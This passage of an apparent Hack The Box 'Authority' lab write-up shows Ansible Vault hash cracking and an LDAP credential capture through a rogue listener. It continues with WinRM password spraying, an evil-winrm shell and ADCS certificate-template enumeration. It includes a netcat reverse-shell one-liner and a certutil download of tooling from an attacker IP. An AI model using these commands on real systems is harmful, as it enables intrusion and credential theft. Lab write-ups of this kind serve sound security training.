+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="nv">ldapServiceName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>authority.htb:authority<span class="nv">$@</span>AUTHORITY.HTB
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="nv">naming_contexts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="s1">&#39;DC=authority,DC=htb&#39;</span>,<span class="w"> </span><span class="s1">&#39;CN=Configuration,DC=authority,DC=htb&#39;</span>,<span class="w"> </span><span class="s1">&#39;CN=Schema,CN=Configuration,DC=authority,DC=htb&#39;</span>,<span class="w"> </span><span class="s1">&#39;DC=DomainDnsZones,DC=authority,DC=htb&#39;</span>,<span class="w"> </span><span class="s1">&#39;DC=ForestDnsZones,DC=authority,DC=htb&#39;</span><span class="o">]</span>
+</pre></div>
+</div>
+<p><a class="reference external" href="https://docs.travis-ci.com/user/environment-variables/#encrypting-environment-variables">https://docs.travis-ci.com/user/environment-variables/#encrypting-environment-variables</a></p>
+</section>
+<section id="cracking-ansible-vault-secrets">
+<h2>Cracking Ansible Vault secrets<a class="headerlink" href="#cracking-ansible-vault-secrets" title="Permalink to this heading">#</a></h2>
+<p>The password for the vaults seems to be stored in an env variable which is encrypted with travis-ci, I don’t know if it is really possible to crack that, but we can attempt to crack the vaults directly</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>/usr/share/john/ansible2john.py<span class="w"> </span>vault.yaml<span class="w"> </span>&gt;<span class="w"> </span>vault.in
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>hashcat<span class="w"> </span>-a0<span class="w"> </span>vault.in<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ansible-vault<span class="w"> </span>decrypt<span class="w"> </span>vault.yml<span class="w"> </span>--vault-password-file<span class="w"> </span>pass
+</pre></div>
+</div>
+</section>
+<section id="exploiting-pwm">
+<h2>Exploiting PWM<a class="headerlink" href="#exploiting-pwm" title="Permalink to this heading">#</a></h2>
+<p>With one of those we can connect to the PWM instance on 8443</p>
+<p>PWM version:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">v2</span><span class="mf">.0.3</span> <span class="n">bc96802e</span>
+</pre></div>
+</div>
+<p>Confirming some existing users and their exact ldap bind domain from somewhere in the configuration app</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">CN</span><span class="o">=</span><span class="n">svc_ldap</span><span class="p">,</span><span class="n">OU</span><span class="o">=</span><span class="n">Service</span> <span class="n">Accounts</span><span class="p">,</span><span class="n">OU</span><span class="o">=</span><span class="n">CORP</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">authority</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span> 
+<span class="n">CN</span><span class="o">=</span><span class="n">Administrator</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">authority</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
+<span class="n">CN</span><span class="o">=</span><span class="n">Guest</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">authority</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
+<span class="n">CN</span><span class="o">=</span><span class="n">krbtgt</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">authority</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
+</pre></div>
+</div>
+<p>Troubleshooting this thing in editor mode to connect it to the ldap instance:<br />
+It won’t connect to authority.htb because that isn’t one of the DNS names in the SAN section of the cert</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">echo</span><span class="w"> </span><span class="p">|</span>openssl<span class="w"> </span>s_client<span class="w"> </span>-connect<span class="w"> </span>htb.corp:636<span class="w"> </span>-showcerts
+openssl<span class="w"> </span>x509<span class="w"> </span>-in<span class="w"> </span>ldap-cert.pem<span class="w"> </span>-noout<span class="w"> </span>-text<span class="w"> </span><span class="p">|</span>grep<span class="w"> </span>Alternative<span class="w"> </span>-A1
+<span class="w">            </span>X509v3<span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>critical
+<span class="w">                </span>othername:<span class="w"> </span>UPN::AUTHORITY<span class="nv">$@</span>htb.corp,<span class="w"> </span>DNS:authority.htb.corp,<span class="w"> </span>DNS:htb.corp,<span class="w"> </span>DNS:HTB
+</pre></div>
+</div>
+<p><code class="docutils literal notranslate"><span class="pre">htb.corp</span></code> is though so if we point it there and import the cert from the server in the PWM client, we get a working connection to the ldap server.
+<img alt="ldap.png" src="../../../../_images/ldap.png" /></p>
+<p>This means it has a valid user:password to connect to ldap, and since we can control where to point it to, we can just point it to ourselves:<br />
+<img alt="intercept.png" src="../../../../_images/intercept.png" /></p>
+<p>Setup a basic listener and hit the <code class="docutils literal notranslate"><span class="pre">Test</span> <span class="pre">Ldap</span> <span class="pre">Profile</span></code> button to get the password</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">636</span>
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">636</span><span class="w"> </span>...
+connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.14.218<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.11.222<span class="o">]</span><span class="w"> </span><span class="m">62853</span>
+0Y<span class="sb">`</span>T<span class="p">;</span><span class="nv">CN</span><span class="o">=</span>svc_ldap,OU<span class="o">=</span>Service<span class="w"> </span>Accounts,OU<span class="o">=</span>CORP,DC<span class="o">=</span>authority,DC<span class="o">=</span>htb************cle4r!
+</pre></div>
+</div>
+</section>
+<section id="bloodhound">
+<h2>BloodHound<a class="headerlink" href="#bloodhound" title="Permalink to this heading">#</a></h2>
+<p>Leveraging bloodhound.py to dump data from the ldap domain from outside. Just for the exercise</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>./bloodhound.py<span class="w"> </span>-d<span class="w"> </span>authority.htb<span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.10.11.222<span class="w"> </span>-u<span class="w"> </span>svc_ldap@authority.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;lD****************&#39;</span>
+INFO:<span class="w"> </span>Found<span class="w"> </span>AD<span class="w"> </span>domain:<span class="w"> </span>authority.htb
+INFO:<span class="w"> </span>Getting<span class="w"> </span>TGT<span class="w"> </span><span class="k">for</span><span class="w"> </span>user
+WARNING:<span class="w"> </span>Failed<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>Kerberos<span class="w"> </span>TGT.<span class="w"> </span>Falling<span class="w"> </span>back<span class="w"> </span>to<span class="w"> </span>NTLM<span class="w"> </span>authentication.<span class="w"> </span>Error:<span class="w"> </span>Kerberos<span class="w"> </span>SessionError:<span class="w"> </span>KRB_AP_ERR_SKEW<span class="o">(</span>Clock<span class="w"> </span>skew<span class="w"> </span>too<span class="w"> </span>great<span class="o">)</span>
+INFO:<span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>LDAP<span class="w"> </span>server:<span class="w"> </span>authority.authority.htb
+WARNING:<span class="w"> </span>LDAP<span class="w"> </span>Authentication<span class="w"> </span>is<span class="w"> </span>refused<span class="w"> </span>because<span class="w"> </span>LDAP<span class="w"> </span>signing<span class="w"> </span>is<span class="w"> </span>enabled.<span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>connect<span class="w"> </span>over<span class="w"> </span>LDAPS<span class="w"> </span>instead...
+INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>domains
+INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>domains<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>forest
+INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>computers
+INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">5</span><span class="w"> </span>users
+INFO:<span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>LDAP<span class="w"> </span>server:<span class="w"> </span>authority.authority.htb
+WARNING:<span class="w"> </span>LDAP<span class="w"> </span>Authentication<span class="w"> </span>is<span class="w"> </span>refused<span class="w"> </span>because<span class="w"> </span>LDAP<span class="w"> </span>signing<span class="w"> </span>is<span class="w"> </span>enabled.<span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>connect<span class="w"> </span>over<span class="w"> </span>LDAPS<span class="w"> </span>instead...
+INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">52</span><span class="w"> </span>groups
+INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">0</span><span class="w"> </span>trusts
+INFO:<span class="w"> </span>Starting<span class="w"> </span>computer<span class="w"> </span>enumeration<span class="w"> </span>with<span class="w"> </span><span class="m">10</span><span class="w"> </span>workers
+INFO:<span class="w"> </span>Querying<span class="w"> </span>computer:<span class="w"> </span>authority.authority.htb
+INFO:<span class="w"> </span>Done<span class="w"> </span><span class="k">in</span><span class="w"> </span>00M<span class="w"> </span>10S
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>neo4j<span class="w"> </span>start
+Directories<span class="w"> </span><span class="k">in</span><span class="w"> </span>use:
+home:<span class="w">         </span>/usr/share/neo4j
+config:<span class="w">       </span>/usr/share/neo4j/conf
+logs:<span class="w">         </span>/usr/share/neo4j/logs
+plugins:<span class="w">      </span>/usr/share/neo4j/plugins
+import:<span class="w">       </span>/usr/share/neo4j
+data:<span class="w">         </span>/usr/share/neo4j/data
+certificates:<span class="w"> </span>/usr/share/neo4j/certificates
+licenses:<span class="w">     </span>/usr/share/neo4j/licenses
+run:<span class="w">          </span>/usr/share/neo4j/run
+Starting<span class="w"> </span>Neo4j.
+Started<span class="w"> </span>neo4j<span class="w"> </span><span class="o">(</span>pid:6463<span class="o">)</span>.<span class="w"> </span>It<span class="w"> </span>is<span class="w"> </span>available<span class="w"> </span>at<span class="w"> </span>http://localhost:7474
+There<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>a<span class="w"> </span>short<span class="w"> </span>delay<span class="w"> </span><span class="k">until</span><span class="w"> </span>the<span class="w"> </span>server<span class="w"> </span>is<span class="w"> </span>ready.
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodhound<span class="w"> </span><span class="p">&amp;</span>
+<span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w"> </span><span class="m">7235</span>
+</pre></div>
+</div>
+<p>Adding the passwords we got to our know users / passwords lists and tryng some winrm bruteforce with crackmapexec</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cme<span class="w"> </span>winrm<span class="w"> </span><span class="m">10</span>.10.11.222<span class="w"> </span>-d<span class="w"> </span>authority.htb<span class="w"> </span>-u<span class="w"> </span>users.txt<span class="w"> </span>-p<span class="w"> </span>passwords.txt
+HTTP<span class="w">        </span><span class="m">10</span>.10.11.222<span class="w">    </span><span class="m">5985</span><span class="w">   </span><span class="m">10</span>.10.11.222<span class="w">     </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>http://10.10.11.222:5985/wsman
+WINRM<span class="w">       </span><span class="m">10</span>.10.11.222<span class="w">    </span><span class="m">5985</span><span class="w">   </span><span class="m">10</span>.10.11.222<span class="w">     </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>authority.htb<span class="se">\s</span>vc_ldap:Su*********
+WINRM<span class="w">       </span><span class="m">10</span>.10.11.222<span class="w">    </span><span class="m">5985</span><span class="w">   </span><span class="m">10</span>.10.11.222<span class="w">     </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>authority.htb<span class="se">\s</span>vc_ldap:T0********
+WINRM<span class="w">       </span><span class="m">10</span>.10.11.222<span class="w">    </span><span class="m">5985</span><span class="w">   </span><span class="m">10</span>.10.11.222<span class="w">     </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>authority.htb<span class="se">\s</span>vc_ldap:T0*********
+WINRM<span class="w">       </span><span class="m">10</span>.10.11.222<span class="w">    </span><span class="m">5985</span><span class="w">   </span><span class="m">10</span>.10.11.222<span class="w">     </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>authority.htb<span class="se">\s</span>vc_ldap:We******
+WINRM<span class="w">       </span><span class="m">10</span>.10.11.222<span class="w">    </span><span class="m">5985</span><span class="w">   </span><span class="m">10</span>.10.11.222<span class="w">     </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>authority.htb<span class="se">\s</span>vc_ldap:De*********
+WINRM<span class="w">       </span><span class="m">10</span>.10.11.222<span class="w">    </span><span class="m">5985</span><span class="w">   </span><span class="m">10</span>.10.11.222<span class="w">     </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>authority.htb<span class="se">\s</span>vc_ldap:pW***********
+WINRM<span class="w">       </span><span class="m">10</span>.10.11.222<span class="w">    </span><span class="m">5985</span><span class="w">   </span><span class="m">10</span>.10.11.222<span class="w">     </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>authority.htb<span class="se">\s</span>vc_ldap:lD****************<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
+</pre></div>
+</div>
+<p>So we now have a valid pair of creds to connect to ldap, but also to winrm</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>evil-winrm<span class="w"> </span>-i<span class="w"> </span>authority.htb<span class="w"> </span>-u<span class="w"> </span>svc_ldap<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;lD****************&#39;</span>
+
+Evil-WinRM<span class="w"> </span>shell<span class="w"> </span>v3.5
+
+Warning:<span class="w"> </span>Remote<span class="w"> </span>path<span class="w"> </span>completions<span class="w"> </span>is<span class="w"> </span>disabled<span class="w"> </span>due<span class="w"> </span>to<span class="w"> </span>ruby<span class="w"> </span>limitation:<span class="w"> </span>quoting_detection_proc<span class="o">()</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>is<span class="w"> </span>unimplemented<span class="w"> </span>on<span class="w"> </span>this<span class="w"> </span>machine
+
+Data:<span class="w"> </span>For<span class="w"> </span>more<span class="w"> </span>information,<span class="w"> </span>check<span class="w"> </span>Evil-WinRM<span class="w"> </span>GitHub:<span class="w"> </span>https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info:<span class="w"> </span>Establishing<span class="w"> </span>connection<span class="w"> </span>to<span class="w"> </span>remote<span class="w"> </span>endpoint
+*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>ocuments&gt;
+</pre></div>
+</div>
+</section>
+<section id="privesc">
+<h2>Privesc<a class="headerlink" href="#privesc" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\u</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>ocuments&gt;<span class="w"> </span>certutil.exe<span class="w"> </span>-urlcache<span class="w"> </span>-f<span class="w"> </span>http://10.10.14.218:9090/winpeas.exe<span class="w"> </span>winpeas.exe
+****<span class="w">  </span>Online<span class="w">  </span>****
+CertUtil:<span class="w"> </span>-URLCache<span class="w"> </span><span class="nb">command</span><span class="w"> </span>completed<span class="w"> </span>successfully.
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\u</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>ocuments&gt;<span class="w"> </span>cmdkey<span class="w"> </span>/list
+
+Currently<span class="w"> </span>stored<span class="w"> </span>credentials:
+
+*<span class="w"> </span>NONE<span class="w"> </span>*
+</pre></div>
+</div>
+<p>Sidenote, here’s how to make a netcat callback from the powershell evil-winrm shell to get a cmd shell</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cmd.exe<span class="w"> </span>/c<span class="w"> </span><span class="s2">&quot;nc64.exe 10.10.14.218 4242 -e cmd.exe&quot;</span>
+</pre></div>
+</div>
+<p>Certs folder</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\C</span>erts&gt;<span class="w"> </span>dir
+
+
+<span class="w">    </span>Directory:<span class="w"> </span>C:<span class="se">\C</span>erts
+
+
+Mode<span class="w">                </span>LastWriteTime<span class="w">         </span>Length<span class="w"> </span>Name
+----<span class="w">                </span>-------------<span class="w">         </span>------<span class="w"> </span>----
+-a----<span class="w">         </span><span class="m">8</span>/5/2023<span class="w">  </span><span class="m">11</span>:39<span class="w"> </span>AM<span class="w">           </span><span class="m">3473</span><span class="w"> </span>cert.pfx
+-a----<span class="w">        </span><span class="m">4</span>/23/2023<span class="w">   </span><span class="m">6</span>:11<span class="w"> </span>PM<span class="w">           </span><span class="m">4933</span><span class="w"> </span>LDAPs.pfx
+-a----<span class="w">         </span><span class="m">8</span>/5/2023<span class="w">   </span><span class="m">1</span>:01<span class="w"> </span>PM<span class="w">          </span><span class="m">45272</span><span class="w"> </span>nc64.exe
+-a----<span class="w">         </span><span class="m">8</span>/4/2023<span class="w">   </span><span class="m">1</span>:12<span class="w"> </span>PM<span class="w">         </span><span class="m">446976</span><span class="w"> </span>Rubeus.exe
+</pre></div>
+</div>
+</section>
+<section id="exploiting-cve-202226923-by-abusing-active-directory-certificate-services-adcs">
+<h2>Exploiting CVE-2022–26923 by Abusing Active Directory Certificate Services (ADCS)<a class="headerlink" href="#exploiting-cve-202226923-by-abusing-active-directory-certificate-services-adcs" title="Permalink to this heading">#</a></h2>
+<p><a class="reference external" href="https://systemweakness.com/exploiting-cve-2022-26923-by-abusing-active-directory-certificate-services-adcs-a511023e5366">https://systemweakness.com/exploiting-cve-2022-26923-by-abusing-active-directory-certificate-services-adcs-a511023e5366</a><br />
+<a class="reference external" href="https://tryhackme.com/room/cve202226923">https://tryhackme.com/room/cve202226923)</a></p>
+<p>See available templates with the built in windows tools, we could grep through those 37 templates manually to find if any of those are vulnerable.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>ocuments&gt;<span class="w"> </span>certutil<span class="w"> </span>-v<span class="w"> </span>-template<span class="p">|</span><span class="k">select</span>-string<span class="w"> </span>Template<span class="se">\[</span>
+
+<span class="w">  </span>Template<span class="o">[</span><span class="m">0</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">1</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">2</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">3</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">4</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">5</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">6</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">7</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">8</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">9</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">10</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">11</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">12</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">13</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">14</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">15</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">16</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">17</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">18</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">19</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">20</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">21</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">22</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">23</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">24</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">25</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">26</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">27</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">28</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">29</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">30</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">31</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">32</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">33</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">34</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">35</span><span class="o">]</span>:
+<span class="w">  </span>Template<span class="o">[</span><span class="m">36</span><span class="o">]</span>:
+</pre></div>
+</div>
+<p>Or we could take the lazy route and automate the process with Certify.exe from Ghostpack</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>*Evil-WinRM* PS C:\Certs&gt; ./Certify.exe find /vulnerable
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ &#39;__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base &#39;CN=Configuration,DC=authority,DC=htb&#39;
+
+[*] Listing info about the Enterprise CA &#39;AUTHORITY-CA&#39;
+
+    Enterprise CA Name            : AUTHORITY-CA
+    DNS Hostname                  : authority.authority.htb
+    FullName                      : authority.authority.htb\AUTHORITY-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=AUTHORITY-CA, DC=authority, DC=htb
+    Cert Thumbprint               : 42A80DC79DD9CE76D032080B2F8B172BC29B0182
+    Cert Serial                   : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
+    Cert Start Date               : 4/23/2023 9:46:26 PM
+    Cert End Date                 : 4/23/2123 9:56:25 PM
+    Cert Chain                    : CN=AUTHORITY-CA,DC=authority,DC=htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+      Allow  ManageCA, ManageCertificates               HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+    Enrollment Agent Restrictions : None
+
+[!] Vulnerable Certificates Templates :
+
+    CA Name                               : authority.authority.htb\AUTHORITY-CA
+    Template Name                         : CorpVPN
+    Schema Version                        : 2
+    Validity Period                       : 20 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+                                      HTB\Domain Computers          S-1-5-21-622327497-3269355298-2248959698-515
+                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+      Object Control Permissions
+        Owner                       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
+        WriteOwner Principals       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
+                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+        WriteDacl Principals        : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
+                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+        WriteProperty Principals    : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
+                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
+                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
+
+
+
+Certify completed in 00:00:10.2922857
+</pre></div>
+</div>
+<p>Certify.exe is cool but is not pointing out the exact reasons why this is vulnerable for dummies like me, so we can do the same thing remotely with certipy</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>certipy<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span>svc_ldap@authority.htb<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;lD****************&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.222
+
+Certipy<span class="w"> </span>v4.7.0<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Finding<span class="w"> </span>certificate<span class="w"> </span>templates
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span><span class="m">37</span><span class="w"> </span>certificate<span class="w"> </span>templates
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Finding<span class="w"> </span>certificate<span class="w"> </span>authorities
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>certificate<span class="w"> </span>authority
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span><span class="m">13</span><span class="w"> </span>enabled<span class="w"> </span>certificate<span class="w"> </span>templates
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>CA<span class="w"> </span>configuration<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;AUTHORITY-CA&#39;</span><span class="w"> </span>via<span class="w"> </span>CSRA
+<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>error<span class="w"> </span><span class="k">while</span><span class="w"> </span>trying<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>CA<span class="w"> </span>configuration<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;AUTHORITY-CA&#39;</span><span class="w"> </span>via<span class="w"> </span>CSRA:<span class="w"> </span>CASessionError:<span class="w"> </span>code:<span class="w"> </span>0x80070005<span class="w"> </span>-<span class="w"> </span>E_ACCESSDENIED<span class="w"> </span>-<span class="w"> </span>General<span class="w"> </span>access<span class="w"> </span>denied<span class="w"> </span>error.
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>CA<span class="w"> </span>configuration<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;AUTHORITY-CA&#39;</span><span class="w"> </span>via<span class="w"> </span>RRP
+<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Failed<span class="w"> </span>to<span class="w"> </span>connect<span class="w"> </span>to<span class="w"> </span>remote<span class="w"> </span>registry.<span class="w"> </span>Service<span class="w"> </span>should<span class="w"> </span>be<span class="w"> </span>starting<span class="w"> </span>now.<span class="w"> </span>Trying<span class="w"> </span>again...
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>CA<span class="w"> </span>configuration<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;AUTHORITY-CA&#39;</span>
